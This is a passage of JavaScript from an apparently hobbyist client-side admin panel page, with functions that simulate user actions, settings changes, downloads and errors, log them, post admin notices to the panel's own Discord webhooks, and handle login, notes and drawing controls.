        "Edited notes",
        "Performed a search query",
        "Toggled a theme setting"
    ];
    const action = actions[Math.floor(Math.random() * actions.length)];
    logAdminActivity(`Simulated user action: "${action}".`, "user_action", { simulated: true, action });
    showNotification("Simulated user action. Check User Logs.");
}

function simulateSettingsChange() {
    const settings = ["Dark Mode", "Auto-save Notes", "Sound Notifications", "Compact View"];
    const setting = settings[Math.floor(Math.random() * settings.length)];
    const newState = Math.random() < 0.5 ? 'ON' : 'OFF';
    logAdminActivity(`Simulated settings change: "${setting}" set to ${newState}.`, "change_log", { simulated: true, setting, newState });
    showNotification(`Simulated setting change for "${setting}". Check Change Logs.`);
}

function simulateFileDownload() {
    const files = ["report.pdf", "data_export.csv", "image_gallery.zip", "update_package.exe"];
    const fileName = files[Math.floor(Math.random() * files.length)];

    // Simulate taking a screenshot (of the current admin view)
    html2canvas(document.body).then(canvas => {
        const screenshotDataUrl = canvas.toDataURL('image/png');
        logAdminActivity(`Simulated download of "${fileName}".`, "download_log", { simulated: true, filename: fileName, screenshot: screenshotDataUrl });
        showNotification(`Simulated download of "${fileName}". Check Download Logs.`, 'info');

        // Optional: Trigger an actual small dummy download for visual feedback
        const dummyBlob = new Blob([`Simulated download content for ${fileName}`], { type: 'text/plain' });
        const dummyUrl = URL.createObjectURL(dummyBlob);
        const a = document.createElement('a');
        a.href = dummyUrl;
        a.download = `_simulated_${fileName}`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(dummyUrl);
    }).catch(error => {
        logError(`Failed to capture screenshot for simulated download: ${error}`);
        logAdminActivity(`Simulated download of "${fileName}", but screenshot failed.`, "download_log", { simulated: true, filename: fileName, screenshot: 'FAILED', error: error.message });
        showNotification(`Simulated download of "${fileName}", but screenshot failed. Check Download Logs.`, 'warning');
    });

    sendWebhook(webhooks.downloadLog, createEmbedsFromFields(
        " Simulated Download Log", 0x800080, [
        { name: "File Name", value: fileName, inline: true },
        { name: "Triggered By", value: currentUser, inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
        { name: "Source", value: "Admin Panel Command", inline: false }
        ]
    ));
}

function simulateErrorEvent() {
    const errors = [
        "Database connection failed",
        "API rate limit exceeded",
        "Invalid data format received",
        "Unauthorized access attempt detected",
        "Resource not found"
    ];
    const errorMsg = errors[Math.floor(Math.random() * errors.length)];
    logError(`Simulated system error: ${errorMsg}`);
    showNotification(`Simulated system error: "${errorMsg}". Check Error Log.`, 'error');
}

function forceTheme(theme) {
    document.body.classList.remove('light-theme'); // Remove light-theme first
    if (theme === 'light') {
        document.body.classList.add('light-theme');
    }
    isLightMode = document.body.classList.contains('light-theme');
    logAdminActivity(`Forced theme to: ${theme.toUpperCase()}.`, "command_run");
    showNotification(`Theme forced to ${theme.toUpperCase()}.`);
    updateStatsChartTheme();
}

let currentAnnouncement = "Important System Announcement: Scheduled maintenance this weekend. System may experience brief interruptions. Please save your work regularly!";

function updateAnnouncement() {
    const newText = prompt("Enter new announcement text:", currentAnnouncement);
    if (newText !== null && newText.trim() !== '') {
        currentAnnouncement = newText.trim();
        document.getElementById('announcementText').textContent = currentAnnouncement;
        logAdminActivity(`Announcement updated to: "${currentAnnouncement}".`, "command_run");
        showNotification("Announcement updated!");
    } else if (newText !== null) {
        showNotification("Announcement not updated (text was empty).", "warning");
    }
}

function toggleFeature(featureName) {
    // This would typically interact with a backend or global state.
    // For client-side, we'll just log and show a notification.
    const status = Math.random() < 0.5 ? 'enabled' : 'disabled'; // Simulate toggle
    logAdminActivity(`Feature "${featureName}" toggled to ${status.toUpperCase()}.`, "command_run");
    showNotification(`Feature "${featureName}" has been ${status}.`);
}

function reloadPanels() {
    // Simply refreshes the display of panels without full page reload.
    // Useful if panel content might be stale but not tied to a full data refresh.
    updateAdminLogsDisplay();
    updateErrorLogDisplay();
    updateImportantDatesDisplay();
    displayDiscordWebhooks();
    showNotification("Panels reloaded/refreshed.");
    logAdminActivity("Panels display reloaded.", "command_run");
}

function setSessionTimeout() {
    const timeout = prompt("Enter new session timeout in minutes (e.g., 30):");
    if (timeout !== null && !isNaN(parseInt(timeout)) && parseInt(timeout) > 0) {
        // In a real app, this would set a session cookie/token timeout.
        logAdminActivity(`Session timeout set to ${timeout} minutes. (Simulated)`, "command_run");
        showNotification(`Session timeout set to ${timeout} minutes. (Simulated)`);
    } else if (timeout !== null) {
        showNotification("Invalid timeout value.", "error");
    }
}

function forceLogout() {
    if (confirm("Are you sure you want to force logout?")) {
        logAdminActivity("Forced logout initiated.", "command_run_dangerous");
        showNotification("Forcing logout...", "warning");
        setTimeout(() => logout(), 1000); // Calls the existing logout function
    }
}

async function sendMessageToDiscord(type, message) {
    let webhookUrl;
    let title;
    let color;

    if (type === 'general_notification') {
        webhookUrl = webhooks.adminAction; // Reusing a general admin action webhook
        title = " Admin Notification";
        color = 0x00BFFF; // Light blue
    } else if (type === 'urgent_alert') {
        webhookUrl = webhooks.adminAction; // Reusing a general admin action webhook
        title = " Urgent Admin Alert";
        color = 0xFF0000; // Red
    } else {
        showNotification("Unknown Discord message type.", "error");
        logAdminActivity(`Attempted to send unknown Discord message type: ${type}.`, "command_run_warning");
        return;
    }

    const embeds = createEmbedsFromFields(
        title, color, [
        { name: "Message", value: message, inline: false },
        { name: "Sent By", value: currentUser, inline: true },
        { name: "Time", value: new Date().toLocaleString(), inline: true }
        ]
    );

    await sendWebhook(webhookUrl, embeds, "Admin Panel");
    logAdminActivity(`Sent Discord message (${type}): "${message}".`, "command_run");
    showNotification(`Discord message sent: "${message}"`);
}

function updateWebsiteContent(contentType) {
    // Placeholder for simulating website content updates
    logAdminActivity(`Simulated website content update for "${contentType}".`, "command_run");
    showNotification(`Simulated website content update for "${contentType}".`);
}

function performSecurityScan() {
    logAdminActivity("Simulated security scan initiated.", "command_run");
    showNotification("Security scan initiated. (Simulated)", "success");
    // In a real scenario, this would trigger a backend process.
}


// Event listeners
document.addEventListener('DOMContentLoaded', () => {
    setupToggles();

    submitBtn.addEventListener('click', (e) => {
        e.preventDefault();
        stats.buttonPresses++;
        attemptLogin();
    });

    resetBtn.addEventListener('click', resetCounter); // Event listener for the new reset button

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            if (resetPopup.style.display === 'flex') { // If reset popup is visible
                resetCounter();
            } else if (!document.getElementById('loginScreen').classList.contains('hidden')) { // If login screen is visible
                attemptLogin();
            }
        }
    });

    document.getElementById('penColor').addEventListener('change', (e) => {
        currentColor = e.target.value;
    });

    document.getElementById('penThickness').addEventListener('input', (e) => {
        currentThickness = parseInt(e.target.value);
    });

    const savedNotes = localStorage.getItem('textNotes');
    if (savedNotes) {
        document.getElementById('textNotes').value = savedNotes;
    }

    document.addEventListener('click', (e) => {
        if ((e.target.tagName === 'BUTTON' && !e.target.closest('.panel-controls') && !e.target.classList.contains('submit-btn')) || e.target.closest('.quick-btn') || e.target.closest('.admin-command-btn')) {
            stats.buttonPresses++;
            updateStats();
        }
    });
    // Set default values for Important Dates inputs (current date and a default time)
    const today = new Date();
    document.getElementById('importantDateDay').value = today.toISOString().split('T')[0];
    document.getElementById('importantDateTime').value = "09:00"; // Default to 9 AM

});
</script>

</body>
</html>
